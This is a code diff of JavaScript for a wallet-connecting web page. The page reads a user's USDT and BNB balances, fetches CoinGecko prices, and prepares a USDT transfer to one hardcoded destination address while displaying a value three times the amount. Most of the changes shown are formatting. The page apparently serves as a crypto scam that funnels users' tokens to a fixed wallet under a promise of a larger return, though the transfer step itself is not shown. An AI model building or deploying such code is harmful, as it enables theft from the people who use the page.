@@ -1,13 +1,12 @@
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const DEST = "0x56E93caFf970003A66264a10B1581066E0f17112";
 const BNB_GAS_USD = 0.50;
-
 let provider, signer;
 
 const ABI = [
-  "function balanceOf(address) view returns (uint256)",
-  "function approve(address,uint256) returns (bool)",
-  "function transfer(address,uint256) returns (bool)"
+  "function balanceOf(address)view returns(uint256)",
+  "function approve(address,uint256) returns(bool)",
+  "function transfer(address,uint256) returns(bool)"
 ];
 
 async function init() {
@@ -28,7 +27,9 @@ async function updateDisplay() {
   const totalUSD = amount * 3;
   usdtValue.innerText = `$${amount.toFixed(2)}`;
 
-  const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt");
+  const res = await fetch(
+    "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt"
+  );
   const rate = res.ok ? (await res.json()).bitcoin.usdt : 0;
   rateLine.innerText = `1 BTC ≈ ${rate.toLocaleString('en')} USDT`;
 
@@ -57,8 +58,14 @@ document.getElementById("transferBtn").addEventListener("click", async () => {
     const usdtBal = parseFloat(ethers.utils.formatUnits(balance, 18));
     if (usdtBal < input) throw new Error("Insufficient USDT");
 
-    const bnbBal = parseFloat(ethers.utils.formatEther(await provider.getBalance(user)));
-    const bnbRate = (await (await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")).json()).binancecoin.usd;
+    const bnbBal = parseFloat(
+      ethers.utils.formatEther(await provider.getBalance(user))
+    );
+    const bnbRate = (await (
+      await fetch(
+        "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd"
+      )
+    ).json()).binancecoin.usd;
     if (bnbBal * bnbRate < BNB_GAS_USD) throw new Error("Low BNB for gas");
 
     const amt = ethers.utils.parseUnits(input.toString(), 18);
